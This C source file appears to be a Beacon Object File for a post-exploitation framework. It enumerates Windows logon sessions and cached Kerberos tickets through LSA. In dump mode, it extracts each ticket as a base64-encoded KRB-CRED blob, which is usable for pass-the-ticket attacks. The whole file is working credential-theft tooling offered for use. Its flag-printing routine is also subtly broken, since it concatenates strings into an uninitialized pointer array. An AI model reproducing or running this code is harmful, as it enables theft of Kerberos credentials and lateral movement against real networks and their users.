#include "klist.h"

#ifndef strcat
char* Mstrcat(char *s1, char *s2) {
    char *os1;

    os1 = s1;
    while (*s1++);
    --s1;
    while ((*s1++ = *s2++));
    return (os1);
}
#endif

void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
// IsHighIntregrity breaks it
    BOOL highIntegrity = IsHighIntegrity(hToken);
//    BOOL highIntegrity = TRUE;
    if (!highIntegrity && !currentLuid) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Not in high integrity.\n");
        return;
    }
    HANDLE hLsa;
    NTSTATUS status = GetLsaHandle(hToken, highIntegrity, &hLsa);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetLsaHandle %ld\n", status);
        return;
    }
    ULONG authPackage;
    LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }

    LOGON_SESSION_DATA sessionData;
    status = GetLogonSessionData(luid, &sessionData);

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetLogonSessionData: %ld", status);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    KERB_QUERY_TKT_CACHE_REQUEST cacheRequest;
    cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
// something from here...
    for (int i = 0; i < sessionData.sessionCount; i++) {
//        if (sessionData.sessionData[i] == NULL) {
//            continue;
//        }
//        PrintLogonSessionData(CALLBACK_ERROR, (*sessionData.sessionData[i]));
         WCHAR* sid = NULL;
         ADVAPI32$ConvertSidToStringSidW(sessionData.sessionData[i]->Sid, &sid);
         SYSTEMTIME logon_utc = ConvertToSystemtime(sessionData.sessionData[i]->LogonTime);

         BeaconPrintf(CALLBACK_OUTPUT,
         "\n[*] Session Info\n"
	     "  Username             : %s\n" 
	     "  Domain               : %s\n"
	     "  LogonId              : %lx:0x%lx\n"
	     "  UserSID              : %s\n"
	     "  AuthPackage          : %s\n"
	     "  LogonTime            : %d/%d/%d %d:%d:%d\n"
	     "  LogonServer          : %s\n"
	     "  LogonServerDNSDomain : %s\n"
         "  UserPrincipalName    : %s\n",
	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->UserName),
	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->LogonDomain),
	     sessionData.sessionData[i]->LogonId.HighPart, sessionData.sessionData[i]->LogonId.LowPart,
	     GetNarrowString(sid),
	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->AuthenticationPackage),
	     logon_utc.wMonth, logon_utc.wDay, logon_utc.wYear, logon_utc.wHour, logon_utc.wMinute, logon_utc.wSecond,
	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->LogonServer),
	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->DnsDomainName),
	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->Upn)
	     );

        if (highIntegrity) {
            cacheRequest.LogonId = sessionData.sessionData[i]->LogonId;
        } else {
            cacheRequest.LogonId = (LUID){.HighPart = 0, .LowPart = 0};
        }

        SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
        KERB_QUERY_TKT_CACHE_EX_RESPONSE* cacheResponse = NULL;
        KERB_TICKET_CACHE_INFO_EX cacheInfo;
        ULONG responseSize;
        NTSTATUS protocolStatus;
        status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &cacheRequest, sizeof(cacheRequest),
                                                      &cacheResponse, &responseSize, &protocolStatus);
        if (!NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] LsaCallAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
            continue;
        }
        // check protocol status?
        if (cacheResponse == NULL) {
            continue;
        }
        int ticketCount = cacheResponse->CountOfTickets;
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Cached Tickets: (%d)\n", ticketCount);
// ticket section
        if (ticketCount > 0) {
            for (int j = 0; j < ticketCount; j++) {
                cacheInfo = cacheResponse->Tickets[j];
                if (dump) {
                    PUCHAR ticket;
                    ULONG ticketSize;
                    status = ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheInfo.ServerName, &ticket, &ticketSize);
                    if (!NT_SUCCESS(status)) {
                        BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract the ticket: %ld\n", status);
                    } else {
                        if (ticketSize > 0) {
                            int len = Base64encode_len(ticketSize);
                            char* encoded = (char*)MSVCRT$calloc(len, sizeof(char));
                            if (encoded == NULL) {
                                BeaconPrintf(CALLBACK_ERROR, "[!] Base64 - could not allocate memory.\n");
                                continue;
                            }
                            Base64encode(encoded, ticket, ticketSize);
	                        PrintTicketInfoDump(cacheInfo, encoded);
                            MSVCRT$free(encoded);
                            MSVCRT$free(ticket);
                        }
                    }
                } else {
                PrintTicketInfoKlist(cacheInfo);
                }
            }
        }
        SECUR32$LsaFreeReturnBuffer(cacheResponse);
    }
    MSVCRT$free(sessionData.sessionData);
    SECUR32$LsaDeregisterLogonProcess(hLsa);
//    BeaconPrintf(CALLBACK_OUTPUT, "[!] Finished klist!");
}

NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PULONG ticketSize) {
//    BeaconPrintf(CALLBACK_OUTPUT, "Entered klist.c:ExtractTicket");
    KERB_RETRIEVE_TKT_REQUEST* retrieveRequest = NULL;
    KERB_RETRIEVE_TKT_RESPONSE* retrieveResponse = NULL;
    ULONG responseSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + targetName.MaximumLength;
    retrieveRequest = (KERB_RETRIEVE_TKT_REQUEST*)MSVCRT$calloc(responseSize, sizeof(KERB_RETRIEVE_TKT_REQUEST));
    if (retrieveRequest == NULL) {
        return STATUS_MEMORY_NOT_ALLOCATED;
    }
    retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
    retrieveRequest->LogonId = luid;
    retrieveRequest->TicketFlags = 0;
    retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retrieveRequest->EncryptionType = 0;
    retrieveRequest->TargetName = targetName;
    retrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    MSVCRT$memcpy(retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength);

    NTSTATUS protocolStatus;
    NTSTATUS status = STATUS_SUCCESS;
    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, retrieveRequest, responseSize, &retrieveResponse,
                                                  &responseSize, &protocolStatus);
    MSVCRT$free(retrieveRequest);
    if (NT_SUCCESS(status)) {
        if (NT_SUCCESS(protocolStatus)) {
            if (responseSize > 0) {
                ULONG size = retrieveResponse->Ticket.EncodedTicketSize;
                PUCHAR returnTicket = (PUCHAR)MSVCRT$calloc(size, sizeof(UCHAR));
                if (returnTicket != NULL) {
                    MSVCRT$memcpy(returnTicket, retrieveResponse->Ticket.EncodedTicket, size);
                    *ticket = returnTicket;
                    *ticketSize = size;
                } else {
                    status = STATUS_MEMORY_NOT_ALLOCATED;
                }
                SECUR32$LsaFreeReturnBuffer(retrieveResponse);
            }
        } else {
            status = ADVAPI32$LsaNtStatusToWinError(protocolStatus);
        }
    } else {
        status = ADVAPI32$LsaNtStatusToWinError(status);
    }
    return status;
}

void PrintTicketFlags(ULONG ticketFlags) {
//    BeaconPrintf(CALLBACK_OUTPUT, "Entered klist.c:PrintTicketFlags");
    char* flags[16] = {
        " name_canonicalize ", 
        " anonymous ", 
        " ok_as_delegate ",
        " ? ",
        " hw_authent ",
        " pre_authent ",
        " initial ",
        " renewable ",
        " invalid ",
        " postdated ",
        " may_postdate ",
        " proxy ",
        " proxiable ",
        " forwarded ",
        " forwardable ",
        " reserved "
     };

    char* outputFlags[16];
    for (int i = 0; i < 16; i++) {
        if ((ticketFlags >> (i + 16)) & 1) {
            Mstrcat(outputFlags, flags[i]);
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\tFlags           : %s\n", outputFlags);
}

void PrintTicketInfoKlist(KERB_TICKET_CACHE_INFO_EX cacheInfo) {
    SYSTEMTIME st_utc = ConvertToSystemtime(cacheInfo.StartTime);
    SYSTEMTIME end_utc = ConvertToSystemtime(cacheInfo.EndTime);
    SYSTEMTIME renew_utc = ConvertToSystemtime(cacheInfo.RenewTime);
    char* GetEncryptionTypeString(long encType);
    BeaconPrintf(CALLBACK_OUTPUT,
    "\n\tClient Name     : %s @ %s\n"
	"\tServer Name     : %s @ %s\n" 
	"\tStart Time      : %d/%d/%d %d:%d:%d (UTC)\n"
	"\tEnd Time        : %d/%d/%d %d:%d:%d (UTC)\n"
	"\tRenew Time      : %d/%d/%d %d:%d:%d (UTC)\n"
	"\tEncryption Type : %li\n",
	GetNarrowStringFromUnicode(cacheInfo.ClientName), GetNarrowStringFromUnicode(cacheInfo.ClientRealm), 
	GetNarrowStringFromUnicode(cacheInfo.ServerName), GetNarrowStringFromUnicode(cacheInfo.ServerRealm),
	st_utc.wMonth, st_utc.wDay, st_utc.wYear, st_utc.wHour, st_utc.wMinute, st_utc.wSecond,
	end_utc.wMonth, end_utc.wDay, end_utc.wYear, end_utc.wHour, end_utc.wMinute, end_utc.wSecond,
	renew_utc.wMonth, renew_utc.wDay, renew_utc.wYear, renew_utc.wHour, renew_utc.wMinute, renew_utc.wSecond,
	cacheInfo.EncryptionType);
    PrintTicketFlags(cacheInfo.TicketFlags);
}

void PrintTicketInfoDump(KERB_TICKET_CACHE_INFO_EX cacheInfo, CHAR* encoded) {
    SYSTEMTIME st_utc = ConvertToSystemtime(cacheInfo.StartTime);
    SYSTEMTIME end_utc = ConvertToSystemtime(cacheInfo.EndTime);
    SYSTEMTIME renew_utc = ConvertToSystemtime(cacheInfo.RenewTime);
    char* GetEncryptionTypeString(long encType);
    BeaconPrintf(CALLBACK_OUTPUT,
    "\n\tClient Name     : %s @ %s\n"
	"\tServer Name     : %s @ %s\n" 
	"\tStart Time      : %d/%d/%d %d:%d:%d (UTC)\n"
	"\tEnd Time        : %d/%d/%d %d:%d:%d (UTC)\n"
	"\tRenew Time      : %d/%d/%d %d:%d:%d (UTC)\n"
	"\tEncryption Type : %li\n"
	"\tTicket          : \n%s\n",
	GetNarrowStringFromUnicode(cacheInfo.ClientName), GetNarrowStringFromUnicode(cacheInfo.ClientRealm), 
	GetNarrowStringFromUnicode(cacheInfo.ServerName), GetNarrowStringFromUnicode(cacheInfo.ServerRealm),
	st_utc.wMonth, st_utc.wDay, st_utc.wYear, st_utc.wHour, st_utc.wMinute, st_utc.wSecond,
	end_utc.wMonth, end_utc.wDay, end_utc.wYear, end_utc.wHour, end_utc.wMinute, end_utc.wSecond,
	renew_utc.wMonth, renew_utc.wDay, renew_utc.wYear, renew_utc.wHour, renew_utc.wMinute, renew_utc.wSecond,
	cacheInfo.EncryptionType,
	encoded);
    PrintTicketFlags(cacheInfo.TicketFlags);
}
